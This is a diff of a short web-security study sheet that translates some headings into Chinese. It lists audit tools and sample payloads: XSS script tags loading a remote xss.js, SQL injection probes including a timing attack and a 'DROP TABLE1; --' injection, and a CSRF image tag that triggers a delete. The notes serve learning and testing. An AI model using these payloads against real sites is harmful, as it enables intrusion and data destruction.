@@ -1,4 +1,4 @@
-# Notes About Web Security
+
 ## Useful Auditing Tools:
 `burpsuite` to capture and modify packets (purchase pro version if you like auto scannning :p)
 
@@ -11,15 +11,15 @@
 `sqlmap` to detect and exploit SQL Injection
 
 and of course `F12(Developer tools)` in Browser(very useful!)
-### #don't be a script kiddy!!
+### #別當 script kiddy!!
 
 
-## Common Vulnerbilities
+## 常見漏洞
 
 ### XSS(Cross Site Scripting)
 
 #### Attacking Vectors
-##### Basic
+##### 基本
 `<script src = www.example.com/xss.js></script>`
  
  or
@@ -39,10 +39,10 @@ and of course `F12(Developer tools)` in Browser(very useful!)
 `<body onresize=alert(1)`
 
 and more on [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
-### SQL Injection
+### SQL 注入
 
 #### Attacking Vectors
-##### Check if the vulnerability exists
+##### 檢查是否有漏洞
 Common vectors like
 
 `'` and `ORDER BY 1`
@@ -55,7 +55,7 @@ Timing attack
 
 `BENCHMARK(878787878787, ('hey', 'you'))`
 
-##### Comment the rest of the query
+##### 註解掉後面的query
 `DROP TABLE1; --`
 
 or
@@ -81,12 +81,12 @@ use `'` and `--` to close brackets and comment the queries
 ##### !No `information_schema` in MySQL < 5!
 ### CSRF (Cross-Site-Request-Forgery)
 #### Attacking Vectors
-Try injecting elements in siteB to siteA:
+將siteB的元素注入到siteA:
 
 `<img src = http://www.siteb.com/blog.php?action=delete></img>`
 
 ### SSRF (Server-Side-Request-Forgery)
-Like CSRF, but inject element to perform request to an intranet server
+很像csrf，但是用來訪問內網的server
 
 
 
